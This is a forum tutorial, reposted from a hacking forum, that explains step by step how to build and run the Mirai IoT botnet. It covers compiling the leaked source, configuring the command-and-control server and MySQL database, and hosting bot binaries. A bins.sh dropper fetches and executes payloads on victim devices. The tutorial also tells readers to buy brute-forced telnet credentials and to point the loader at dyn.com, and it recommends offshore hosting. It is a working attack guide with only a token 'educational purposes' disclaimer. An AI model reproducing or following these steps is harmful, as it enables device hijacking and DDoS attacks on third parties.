Thank you dear,  Jihadi4Prez to share this good tutorial,


███╗   ███╗██╗██████╗  █████╗ ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
████╗ ████║██║██╔══██╗██╔══██╗██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
██╔████╔██║██║██████╔╝███████║██║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║  
██║╚██╔╝██║██║██╔══██╗██╔══██║██║    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║  
██║ ╚═╝ ██║██║██║  ██║██║  ██║██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║  
╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝  
 
              ████████╗██╗   ██╗████████╗ ██████╗ ██████╗ ██╗ █████╗ ██╗    
              ╚══██╔══╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██║██╔══██╗██║    
                 ██║   ██║   ██║   ██║   ██║   ██║██████╔╝██║███████║██║    
                 ██║   ██║   ██║   ██║   ██║   ██║██╔══██╗██║██╔══██║██║    
                 ██║   ╚██████╔╝   ██║   ╚██████╔╝██║  ██║██║██║  ██║███████╗
                 ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
                                                                                                                         
                                   By - Jihadi4Potus
                                       Boatnet.us
                    Refrence: https://www.youtube.com/watch?v=G4vUp3ydjs0
 
 MINIMUM REQUERIMENTS 
 2/3 Server (VPS) or (VPS OFFSHORE BOX)
 
 Install:
 
 Winscp
 Putty
 or
 MobaXterm & Putty
 
+--- 
|** for links use google.com**
|** --> USE THE OFFICIAL WEBSITE NO OTHERS <--**
+--- 
 
System Requirements:

+ ---------------------
| OS: Debian 86x_64x
| RAM: 8GB / 10GB
| Internet Speed:
| Down
| 800Mb/s
| Up
| 200Mb/s
| CPU:
| Xeon
| HDD
| 120GB 
+----------------------


---- Mirai Source - https://github.com/jgamblin/Mirai-Source-Code
 
 


To get the Mirai Iot Botnet 
Follow this code;

--------------------------------------------------------

code:

git clone https://github.com/jgamblin/Mirai-Source-Code

--------------------------------------------------------


Suggestion VPS

----------------------------------------------------------------+
                                                                |
                                                                |
                                                                |
[x0] Hosting Providers.                                         |
                                                                |
https://www.nforce.com/                                         |
                                                                |  
http://www.novogara.com/                                        |
                                                                |
https://www.dataclub.biz/ (Accepts Everything but Paypal.)      |
                                                                |
https://www.bhost.net                                           |
                                                                |
                                                                |
----------------------------------------------------------------+ 
**Google for more vps server's (AWS,AZURE, GoogleComputer engine, etc...)




To get the Mirai Iot Botnet 
Follow this code;

--------------------------------------------------------

code:

git clone https://github.com/jgamblin/Mirai-Source-Code


------------------//---------------------//-------------------
This is a fully tutorial how to setup mirai from scratch.
ENJOY :)

This fixes golang errors when ./build debug telnet , is executed.
 
 

[Step1] - Install the following on a Debian box. ex. Debian 7 x86_64-

code:

 apt-get update -y
 apt-get upgrade -y
 
 apt-get install gcc golang electric-fence sudo git -y
 
 apt-get install mysql-server mysql-client -y
 
 
 -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 
 
[Step2] - Installing and compiling the cross-compilers

If you run ( ./build.sh ) in  ( ../mirai )  folder you will get an error for armv6l, 
In the main tutorial this wasn't included so I added it to make life easier.

*Added:armv5l.tar.bz2 && armv6l.tar.bz2 


 code:
 
 
 
 mkdir /etc/xcompile
 cd /etc/xcompile
 
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
 wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
 
 tar -jxf cross-compiler-armv4l.tar.bz2
 tar -jxf cross-compiler-armv5l.tar.bz2
 tar -jxf cross-compiler-armv6l.tar.bz2
 tar -jxf cross-compiler-i586.tar.bz2
 tar -jxf cross-compiler-i686.tar.bz2
 tar -jxf cross-compiler-m68k.tar.bz2
 tar -jxf cross-compiler-mips.tar.bz2
 tar -jxf cross-compiler-mipsel.tar.bz2
 tar -jxf cross-compiler-powerpc.tar.bz2
 tar -jxf cross-compiler-sh4.tar.bz2
 tar -jxf cross-compiler-sparc.tar.bz2
 tar -jxf cross-compiler-x86_64.tar.bz2
 
 
 rm *.tar.bz2
 mv cross-compiler-armv4l armv4l
 mv cross-compiler-armv5l armv5l
 mv cross-compiler-armv6l armv6l
 mv cross-compiler-i586 i586
 mv cross-compiler-i686 i686
 mv cross-compiler-m68k m68k
 mv cross-compiler-mips mips
 mv cross-compiler-mipsel mipsel
 mv cross-compiler-powerpc powerpc
 mv cross-compiler-sh4 sh4
 mv cross-compiler-sparc sparc
 mv cross-compiler-x86_64 x86_64


-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------

[Step3] - Adding GoLang paths.
Execute these in your ssh terminal, this will add to your ~/.bashrc

code:

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
 
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/Documents/go



-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------


 
[Step4] - Fixing errors.

Type this code and see if you get some errors,
get sure you are in this directory --> ../Mirai-Source-code/mirai


code:

./build.sh debug telnet



-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
**NOTE**
[Step4] - Continue...



 If you did this command before step 2 & 3 you would get an error about the Mysql and sql-drivers, 
 since that's what alot of people have had trouble with. This fixes that.
 
 
 code:
 
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords


-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 
 
 
[Step5] -Obfuscated string

I'm running Debian 8 x86_64 so this might be diffrent for you, 

but the ../debug/enc string {your.domain.com} wasn't working for me so the fix is below,

make sure you're in /mirai/debug

changeme.com <---- (PUT YOUR DOMAIN !!!) if you don't have get one on godaddy or use NO-IP for free use.




code:
 ./enc string changeme.com
 
 
-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------

[Step5] - Obfuscated string continuation...
Copy the result code, is the result you get after entering the last code:

EXEMPLE OF THE RESULT:

XOR'ing 20 bytes of data...
\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22


-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------

[Step6] - Add the code result (\x44\etc....) in table.c

Exemple of the Result:

XOR'ing 20 bytes of data...
\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22


-----EXEMPLE END HERE------

Now add this code in to your ./Mirai-Source-Code/mirai/bot/table.c  file.

Use Winscp if you don't know how to use ("vi") command use Winscp and browse at the table.c to edit and add YOUR result.



-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 
[Step7] - Database setup

Now we going to setup the database permissions and users.
If you have iptbales/ip6tables or any firewall install disable it.



code:

service iptables stop
/etc/ini.d/iptbales stop
 

-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------

[Step7] - Database setup

code:

/usr/bin/mysql_secure_installation


-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
**
It will ask you to set a password, make sure you remember this.


--------------------------------------------------------------------------------------------

[Step7] - Database setup
Edit your ( main.go ) file located in ../mirai/cnc/

and edit this string in main.go use Winscp if you don't know how to use (vi), and change the info to your info,

THIS EXEMPLE IS IF YOUR MySQL PASSWORD IS:
MySQL_Password


exemple:

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "MySQL_Password"
const DatabaseTable string  = "mirai"

-------------------------NO MORE MODIFICATIONS -------------------STOP HERE AND READ----------------

[Step8] - Database create users and permissions.

Once you've done the step above were going to add the database and user perms. follow this link.



code:
mysql -rroot -pMySQL_Password


-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step8] - Database create users and permissions.

Create the database first,


code:

create database mirai;

-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step8] - Database create users and permissions.

Select the database,


code:

use mirai;

-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step8] - Database create database tables.

Copy and paste this code into your terminal.

code:


CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);


-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step8] - Database create users and permissions.

change (anna-senpai) to your username and (myawesomepassword) to your passoword please use a strong password no 123456789,

Please copy and paste on a note bloc to do this modification,
before.

And put in your Debian 86x_64x terminal.


code:

INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');


-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step9] - Restart mysql server.

Now, restart mysql server is needed to be sure the tables run with mysql,

code:

service mysql restart

-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step10] - Execute the Mirai Iot Botnet server.

Once you restart the mysql server, go to your debug folder ./mirai/release ,
you will seen a compiled file named cnc execute it.


You should see - http://prntscr.com/dnsluv
after put the the code below:

code:

./cnc

-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step11] - Move the prompt.txt 

Now your going to have to move the (prompt.txt) file in  ( ../mirai  ) and move into the ../mirai/release folder

-------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step12] - Use the putty.


Now open Putty and select TELNET and put your IP or your.domain.com
 
 --------------------------------------------STOP HERE AND READ----------------
 [Step13] - Login.
 
 remmeber when you have puted in this string your usename and password

  *** in [Step8] - Database create users and permissions. ***

INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');

-------//----
OKAY,well use this user name and password to login in this case the username is:
anna-senpai 

and the password is :

myawesomepassword

--------------------------------------------------------------------------------------------

[Step14] - again in you server Terminal some like Putty or mobaxterm.

Go to this directory ../Mirai-Source-Code/mirai/release

code:

cd ./Mirai-Source-Code/mirai/release

--------------------------------------------------------------------------------------------

[Step15] - Install apache server.
well we go to install apache server just copy and paste,


code:

sudo apt-get install apache2 -y

--------------------------------------------------------------------------------------------

[Step15] - start the apache server.

well apache is installed if you follow the step15, we need to start the service


code:

service apache2 start

 -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
[Step16] - copy the mirai files at the apache source.

code: 

cp mirai.* /var/www/html

 -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 
 [Step17] - Check if the files is correctly copyed !
 
 move the terminal at ../www/html ,
 if you have some problem with the code below remove the DOT (.) 
 check if the files you have copyed is right here 
 
 code:
 
 cd ./var/www/html
 ls
 
 -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 [Step18] - Delete the Index.html
 
 well we need to delete the index to show the index file directory on browser ,
 
 code:
 
 rm /var/www/html/index.html
 
  -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 [Step19] - check if you see the files.
 
 well check if you see the files moved in earl step 
 
 Open one browser exemple: ( Firefox )
 type the ip and enter and check if you see the files 
 
 -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 [Step20] - create and unpload the bins.sh file
 
 well to create this file use the notepadc++ look on google and use the official web site and install it.
 
 open and create a new document (empty document)
 
 and copy and paste this but change this area (IP OR HOSTNAME:80) put you IP or you host name some exemple:
 8.8.8.8:80
 or
 google.com:80 
 
 
 copy and paste this code and save the file in this name bins.sh please look if don't have any txt or something after the .sh
 is not bins.sh.txt!!!
 
 is only ----> bins.sh 
 
 copy, paste and save with this name bins.sh
 code: 
 
 
 
 #!/bin/sh

# Edit
WEBSERVER="IP OR HOSTNAME:80"
# Stop editing now 

BINARIES="mirai.arm mirai.m68k miraint.x86 miraint.spc miraint.sh4 miraint.ppc miraint.mpsl miraint.mips miraint.arm7 miraint.arm5n miraint.arm"

for Binary in $BINARIES; do
	wget http://$WEBSERVER/$Binary -O dvrHelper
	chmod 777 dvrHelper
	./dvrHelper
done

rm -f "

 
 
 
 -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 [Step20] - create and unpload the bins.sh file
 
 well nice, well open Winscp or Mobaxterm 
 and open you vps server in sftp (22) and unpload at this directory,
 
 directory to unpload the (bins.sh)file,
 
 /var/www/html/

 wait some seconds to be sure is realy uploaded,
 and open again the ssh terminal with putty or Mobaxterm and type this code and check if its apear in the http://YOUR.IP.OR.HOSTNAME:80 

 
 code: 
 
 service apache2 restart
 
 -------------------------NO MORE CODE-------------------STOP HERE AND READ----------------
 
 WELL AT THIS TIME AT NORMALLY EVERYTHING IS GOOD 
 after this step is only what i know about loadering bot to attack
 
 
 I'M NOT SURE ABOUT THIS BUT OPEN YOU CASE STUDY AND REPORT AND LET SOME COMMEND IN HACKFORUMS
 
 [Step21] - Loader reads telnet entries from STDIN in following format:
 
 ip:port user:pass
 
well get a list of bruted Iot device or do it yourself or buy on deepweb or in other cool websites :)

create a txt file with notepad or note bloc and put in this in the file .txt in this sense, AND UNPLOAD IN YOU VPS
in this directory ../Mirai-Source-Code/loader/

Code:

Exemple:

212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
212.192.143.174:23 Admin:1234
 
 
[Step22] - Will build the loader, optimized, production use, no fuss.
open the terminal and go to this directory 
../Mirai-Source-Code/loader/

and type this code:

code:

/build.sh

and after than type this code but put you filename here --> file.txt before paste 

code:

cat file.txt | ./loader wget http://dyn.com

-------------------------------#FINISH, THE END #-----------------

 R.I.P      R.I.P
2001-2016  2004-
DynDns      Facebook,YouTube,SIP(Service Iternet Provider) 




Congrats you setup mirai successfully!!



Congrats for our friend Jihadi4Prez to do this help full to make a more detailed tutorial, if somebody whant to do a more detailed 
tuto he can use this tuto to get a base.

Source:
http://pwoah7foa6au2pul.onion/forum/index.php?threads/mirai-mirai-iot-bot-net-ddos-have-killed-dyndns-in-2016.138057/




** !!!!! FOR EDUCATIONAL PURPOSES ONLY !!!!!!!! **

**AND NOT FOR DDOS ATTACKS**


Sincerely,
Screamfox
